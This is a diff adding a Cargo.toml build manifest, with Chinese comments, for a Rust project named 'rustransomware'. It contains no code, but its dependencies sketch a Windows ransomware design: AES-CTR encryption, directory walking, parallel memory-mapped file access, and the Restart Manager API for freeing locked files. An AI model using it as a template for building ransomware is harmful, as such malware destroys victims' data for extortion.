@@ -1,0 +1,35 @@
+[package]
+name = "rustransomware"
+version = "0.1.0"
+edition = "2024"
+
+[profile.release]
+opt-level = "z"          # 以最小尺寸为优化目标（等同于 -Oz）
+lto = true               # 启用链接时优化（Link Time Optimization）
+codegen-units = 1        # 单一代码生成单元，配合 LTO 以获得最大体积缩减
+panic = "abort"          # 异常时直接中止，不展开堆栈，去除 unwinding 逻辑
+overflow-checks = false  # 关闭整数溢出检查（Release 默认即关闭，可显式指定）
+debug = false            # 不包含调试符号
+
+[dependencies]
+aes            = "0.8"
+ctr            = "0.9"
+rand           = "0.8"
+base64         = "0.21"
+mem            = "0.5.0"
+walkdir        = "2.3"
+rayon          = "1.10.0"
+memmap2        = "0.9.5"
+env            = "1.0.1"
+image          = { version = "0.24", features = ["bmp", "png", "jpeg"] }
+winapi         = { version = "0.3", features = ["winuser"] }
+widestring = "0.4"
+windows-sys = { version = "0.48", features = [
+    "Win32_Storage_FileSystem",   # CreateFile 标志
+    "Win32_System_Memory",        # VirtualLock
+    "Win32_System_RestartManager",# Restart Manager API
+    "Win32_Foundation",           # 基础类型
+    "Win32_System_LibraryLoader", # GetCurrentProcess
+] }
+
+
